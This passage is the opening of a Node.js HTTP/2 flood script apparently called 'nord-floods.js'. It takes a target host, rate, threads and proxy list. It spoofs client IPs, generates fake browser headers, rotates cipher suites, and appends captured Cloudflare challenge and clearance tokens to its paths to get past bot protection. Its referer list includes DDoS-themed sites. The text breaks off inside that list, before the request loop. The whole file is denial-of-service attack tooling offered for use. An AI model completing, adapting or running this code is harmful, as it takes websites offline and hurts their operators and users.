const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const { HeaderGenerator } = require('header-generator');
 const fs = require("fs");
 const chalk = require('chalk');
 const figlet = require('figlet');
 const gradient = require('gradient-string');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

    let headerGenerator = new HeaderGenerator({
      browsers: [
          { name: "firefox", minVersion: 112, httpVersion: "2" },
          { name: "opera", minVersion: 112, httpVersion: "2" },
          { name: "edge", minVersion: 112, httpVersion: "2" },
          { name: "chrome", minVersion: 112, httpVersion: "2" },
          { name: "safari", minVersion: 16, httpVersion: "2" },
      ],
      devices: [
          "desktop",
          "mobile",
      ],
      operatingSystems: [
          "windows",
          "linux",
          "macos",
          "android",
          "ios",
      ],
      locales: ["en-US", "en"]
  });
  let randomHeaders = headerGenerator.getHeaders()

 if (process.argv.length < 7){console.log('ex: node nord-floods.js <host> <time> <rps> <threads> <proxyfile>'); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }
 
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();
 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 }
 const sig = [    
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
 ];
 
 const pathts = [
    "/",
    "?page=1",
    "?page=2",
    "?page=3",
    "?category=news",
    "?category=sports",
    "?category=technology",
    "?category=entertainment", 
    "?sort=newest",
    "?filter=popular",
    "?limit=10",
    "?start_date=1989-06-04",
    "?end_date=1989-06-04",
    "?__cf_chl_rt_tk=nP2tSCtLIsEGKgIBD2SztwDJCMYm8eL9l2S41oCEN8o-1702888186-0-gaNycGzNCWU",
"?__cf_chl_rt_tk=yI__zhdK3yR99B6b9jRkQLlvIjTKu7_2YI33ZCB4Pbo-1702888463-0-gaNycGzNFGU",
"?__cf_chl_rt_tk=QbxNnnmC8FpmedkosrfaPthTMxzFMEIO8xa0BdRJFKI-1702888720-0-gaNycGzNFHs",
"?__cf_chl_rt_tk=ti1J.838lGH8TxzcrYPefuvbwEORtNOVSKFDISExe1U-1702888784-0-gaNycGzNClA",
"?__cf_chl_rt_tk=ntO.9ynonIHqcrAuXZJBTcTBAMsENOYqkY5jzv.PRoM-1702888815-0-gaNycGzNCmU",
"?__cf_chl_rt_tk=SCOSydalu5acC72xzBRWOzKBLmYWpGxo3bRYeHFSWqo-1702888950-0-gaNycGzNFHs",
"?__cf_chl_rt_tk=QG7VtKbwe83bHEzmP4QeG53IXYnD3FwPM3AdS9QLalk-1702826567-0-gaNycGzNE9A",
"?__cf_chl_rt_tk=C9XmGKQztFjEwNpc0NK4A3RHUzdb8ePYIAXXzsVf8mk-1702889060-0-gaNycGzNFNA",
"?__cf_chl_rt_tk=cx8R_.rzcHl0NQ0rBM0cKsONGKDhwNgTCO1hu2_.v74-1702889131-0-gaNycGzNFDs",
"?__cf_chl_rt_tk=AnEv0N25BNMaSx7Y.JyKS4CV5CkOfXzX1nyIt59hNfg-1702889155-0-gaNycGzNCdA",
"?__cf_chl_rt_tk=7bJAEGaH9IhKO_BeFH3tpcVqlOxJhsCTIGBxm28Uk.o-1702889227-0-gaNycGzNE-U",
"?__cf_chl_rt_tk=rrE5Pn1Qhmh6ZVendk4GweUewCAKxkUvK0HIKJrABRc-1702889263-0-gaNycGzNCeU",
"?__cf_chl_rt_tk=.E1V6LTqVNJd5oRM4_A4b2Cm56zC9Ty17.HPUEplPNc-1702889305-0-gaNycGzNCbs",
"?__cf_chl_rt_tk=a2jfQ24eL6.ICz01wccuN6sTs9Me_eIIYZc.94w6e1k-1702889362-0-gaNycGzNCdA",
"?__cf_chl_rt_tk=W_fRdgbeQMmtb6FxZlJV0AmS3fCw8Tln45zDEptIOJk-1702889406-0-gaNycGzNE9A",
"?__cf_chl_rt_tk=4kjttOjio0gYSsNeJwtzO6l1n3uZymAdJKiRFeyETes-1702889470-0-gaNycGzNCfs",
"?__cf_chl_rt_tk=Kd5MB96Pyy3FTjxAm55aZbB334adV0bJax.AM9VWlFE-1702889600-0-gaNycGzNCdA",
"?__cf_chl_rt_tk=v2OPKMpEC_DQu4NlIm3fGBPjbelE6GWpQIgLlWzjVI0-1702889808-0-gaNycGzNCeU",
"?__cf_chl_rt_tk=vsgRooy6RfpNlRXYe7OHYUvlDwPzPvAlcN15SKikrFA-1702889857-0-gaNycGzNCbs",
"?__cf_chl_rt_tk=EunXyCZ28KJNXVFS.pBWL.kn7LZdU.LD8uI7uMJ4SC4-1702889866-0-gaNycGzNCdA",
"?__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0",
"?__cf_bm=ZOpceqqH3pCP..NLyk5MVC6eHuOOlnbTRPDtVGBx4NU-1702890174-1-AWt2pPHjlDUtWyMHmBUU2YbflXN+dZL5LAhMF+91Tf5A4tv5gRDMXiMeNRHnPzjIuO6Nloy0XYk56K77cqY3w9o=; cf_bm=kIWUsH8jNxV.ERL_Uc_eGsujZ36qqOiBQByaXq1UFH0-1702890176-1-AbgFqD6R4y3D21vuLJdjEdIHYyWWCjNXjqHJjxebTVt54zLML8lGpsatdxb/egdOWvq1ZMgGDzkLjiQ3rHO4rSYmPX/tF+HGp3ajEowPPoSh",
"?__cf_clearance=.p2THmfMLl5cJdRPoopU7LVD_bb4rR83B.zh4IAOJmE-1702890014-0-1-a33b4d97.179f1604.f43a1277-160.0.0",
"?__cf_clearance=YehxiFDP_T5Pk16Fog33tSgpDl9SS7XTWY9n3djMkdE-1702890321-0-1-a33b4d97.e83179e2.f43a1277-160.0.0",
"?__cf_clearance=WTgrd5qAue.rH1R0LcMkA9KuGXsDoq6dbtMRaBS01H8-1702890075-0-1-a33b4d97.75c6f2a1.e089e1cd-160.0.0",
"?__cf_chl_rt_tk=xxsEYpJGdX_dCFE7mixPdb_xMdgEd1vWjWfUawSVmFo-1702890787-0-gaNycGzNE-U", "?__cf_chl_rt_tk=4POs4SKaRth4EVT_FAo71Y.N302H3CTwamQUm1Diz2Y-1702890995-0-gaNycGzNCiU",
"?__cf_chl_rt_tk=ZYYAUS10.t94cipBUzrOANLleg6Y52B36NahD8Lppog-1702891100-0-gaNycGzNFGU",
"?__cf_chl_rt_tk=qFevwN5uCe.mV8YMQGGui796J71irt6PzuRbniOjK1c-1702891205-0-gaNycGzNChA",
"?__cf_chl_rt_tk=Jc1iY2xE2StE8vqebQWb0vdQtk0HQ.XkjTwCaQoy2IM-1702891236-0-gaNycGzNCiU",
"?__cf_chl_rt_tk=Xddm2Jnbx5iCKto6Jjn47JeHMJuW1pLAnGwkkvoRdoI-1702891344-0-gaNycGzNFKU",
"?__cf_chl_rt_tk=0bvigaiVIw0ybessA948F29IHPD3oZoD5zWKWEQRHQc-1702891370-0-gaNycGzNCjs",
"?__cf_chl_rt_tk=Vu2qjheswLRU_tQKx9.W1FM0JYjYRIYvFi8voMP_OFw-1702891394-0-gaNycGzNClA",
"?__cf_chl_rt_tk=8Sf_nIAkrfSFmtD.yNmqWfeMeS2cHU6oFhi9n.fD930-1702891631-0-gaNycGzNE1A",
"?__cf_chl_rt_tk=A.8DHrgyQ25e7oEgtwFjYx5IbLUewo18v1yyGi5155M-1702891654-0-gaNycGzNCPs",
"?__cf_chl_rt_tk=kCxmEVrrSIvRbGc7Zb2iK0JXYcgpf0SsZcC5JAV1C8g-1702891689-0-gaNycGzNCPs", "?page=1", "?page=2", "?page=3", "?category=news", "?category=sports", "?category=technology", "?category=entertainment", "?sort=newest", "?filter=popular", "?limit=10", "?start_date=1989-06-04", "?end_date=1989-06-04"
  ];

const cplist = [
  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
  'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
  "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
  "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
  "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
  "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
  'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
  'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
  "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
  "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
  "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
  "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
  'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
  'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
  ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    ];

 const lang_header = ["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
 "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
 "en-US,en;q=0.5", "en-US,en;q=0.9",
 "de-CH;q=0.7",
 "da, en-gb;q=0.8, en;q=0.7",
 "cs;q=0.5",
 'en-US,en;q=0.9',
 'en-GB,en;q=0.9',
 'en-CA,en;q=0.9',
 'en-AU,en;q=0.9',
 'en-NZ,en;q=0.9',
 'en-ZA,en;q=0.9',
 'en-IE,en;q=0.9',
 'en-IN,en;q=0.9',
 'ar-SA,ar;q=0.9',
 'az-Latn-AZ,az;q=0.9',
 'be-BY,be;q=0.9',
 'bg-BG,bg;q=0.9',
 'bn-IN,bn;q=0.9',
 'ca-ES,ca;q=0.9',
 'cs-CZ,cs;q=0.9',
 'cy-GB,cy;q=0.9',
 'da-DK,da;q=0.9',
 'de-DE,de;q=0.9',
 'el-GR,el;q=0.9',
 'es-ES,es;q=0.9',
 'et-EE,et;q=0.9',
 'eu-ES,eu;q=0.9',
 'fa-IR,fa;q=0.9',
 'fi-FI,fi;q=0.9',
 'fr-FR,fr;q=0.9',
 'ga-IE,ga;q=0.9',
 'gl-ES,gl;q=0.9',
 'gu-IN,gu;q=0.9',
 'he-IL,he;q=0.9',
 'hi-IN,hi;q=0.9',
 'hr-HR,hr;q=0.9',
 'hu-HU,hu;q=0.9',
 'hy-AM,hy;q=0.9',
 'id-ID,id;q=0.9',
 'is-IS,is;q=0.9',
 'it-IT,it;q=0.9',
 'ja-JP,ja;q=0.9',
 'ka-GE,ka;q=0.9',
 'kk-KZ,kk;q=0.9',
 'km-KH,km;q=0.9',
 'kn-IN,kn;q=0.9',
 'ko-KR,ko;q=0.9',
 'ky-KG,ky;q=0.9',
 'lo-LA,lo;q=0.9',
 'lt-LT,lt;q=0.9',
 'lv-LV,lv;q=0.9',
 'mk-MK,mk;q=0.9',
 'ml-IN,ml;q=0.9',
 'mn-MN,mn;q=0.9',
 'mr-IN,mr;q=0.9',
 'ms-MY,ms;q=0.9',
 'mt-MT,mt;q=0.9',
 'my-MM,my;q=0.9',
 'nb-NO,nb;q=0.9',
 'ne-NP,ne;q=0.9',
 'nl-NL,nl;q=0.9',
 'nn-NO,nn;q=0.9',
 'or-IN,or;q=0.9',
 'pa-IN,pa;q=0.9',
 'pl-PL,pl;q=0.9',
 'pt-BR,pt;q=0.9',
 'pt-PT,pt;q=0.9',
 'ro-RO,ro;q=0.9',
 'ru-RU,ru;q=0.9',
 'si-LK,si;q=0.9',
 'sk-SK,sk;q=0.9',
 'sl-SI,sl;q=0.9',
 'sq-AL,sq;q=0.9',
 'sr-Cyrl-RS,sr;q=0.9',
 'sr-Latn-RS,sr;q=0.9',
 'sv-SE,sv;q=0.9',
 'sw-KE,sw;q=0.9',
 'ta-IN,ta;q=0.9',
 'te-IN,te;q=0.9',
 'th-TH,th;q=0.9',
 'tr-TR,tr;q=0.9',
 'uk-UA,uk;q=0.9',
 'ur-PK,ur;q=0.9'
];
 
 const encoding_header = [
    'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate'
 ];
 
 const control_header = [
    'max-age=604800',
  'proxy-revalidate',
  'public, max-age=0',
  'max-age=315360000',
  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
  's-maxage=604800',
  'max-stale',
  'public, immutable, max-age=31536000',
  'must-revalidate',
  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
  'max-age=31536000,public,immutable',
  'max-age=31536000,public',
  'min-fresh',
  'private',
  'public',
  's-maxage',
  'no-cache',
  'no-cache, no-transform',
  'max-age=2592000',
  'no-store',
  'no-transform',
  'max-age=31557600',
  'stale-if-error',
  'only-if-cached',
  'max-age=0',
  'must-understand, no-store',
  'max-age=31536000; includeSubDomains',
  'max-age=31536000; includeSubDomains; preload',
  'max-age=120',
  'max-age=0,no-cache,no-store,must-revalidate',
  'public, max-age=604800, immutable',
  'max-age=0, must-revalidate, private',
  'max-age=0, private, must-revalidate',
  'max-age=604800, stale-while-revalidate=86400',
  'max-stale=3600',
  'public, max-age=2678400',
  'min-fresh=600',
  'public, max-age=30672000',
  'max-age=31536000, immutable',
  'max-age=604800, stale-if-error=86400',
  'public, max-age=604800',
  'no-cache, no-store,private, max-age=0, must-revalidate',
  'o-cache, no-store, must-revalidate, pre-check=0, post-check=0',
  'public, s-maxage=600, max-age=60'
 ];
 
 const refers = [
  "https://www.google.com/search?q=",
  "https://check-host.net/",
  "https://www.facebook.com/",
  "https://www.youtube.com/",
  "https://www.fbi.com/",
  "https://www.bing.com/search?q=",
  "https://r.search.yahoo.com/",
  "https://www.cia.gov/index.html",
  "https://vk.com/profile.php?redirect=",
  "https://www.usatoday.com/search/results?q=",
  "https://help.baidu.com/searchResult?keywords=",
  "https://steamcommunity.com/market/search?q=",
  "https://www.ted.com/search?q=",
  "https://play.google.com/store/search?q=",
  "https://www.qwant.com/search?q=",
  "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
  "https://www.google.ad/search?q=",
  "https://www.google.ae/search?q=",
  "https://www.google.com.af/search?q=",
  "https://www.google.com.ag/search?q=",
  "https://www.google.com.ai/search?q=",
  "https://www.google.al/search?q=",
  "https://www.google.am/search?q=",
  "https://www.google.co.ao/search?q=",
  "http://anonymouse.org/cgi-bin/anon-www.cgi/",
  "http://coccoc.com/search#query=",
  "http://ddosvn.somee.com/f5.php?v=",
  "http://engadget.search.aol.com/search?q=",
  "http://engadget.search.aol.com/search?q=query?=query=&q=",
  "http://eu.battle.net/wow/en/search?q=",
  "http://filehippo.com/search?q=",
  "http://funnymama.com/search?q=",
  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
  "http://go.mail.ru/search?mail.ru=1&q=",
  "http://help.baidu.com/searchResult?keywords=",
  "http://host-tracker.com/check_page/?furl=",
  "http://itch.io/search?q=",
  "http://jigsaw.w3.org/css-validator/validator?uri=",
  "http://jobs.bloomberg.com/search?q=",
  "http://jobs.leidos.com/search?q=",
  "http://jobs.rbs.com/jobs/search?q=",
  "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=",
  "http://louis-ddosvn.rhcloud.com/f5.html?v=",
  "http://millercenter.org/search?q=",
  "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=",
  "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/",
  "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=",
  "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/",
  "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=",
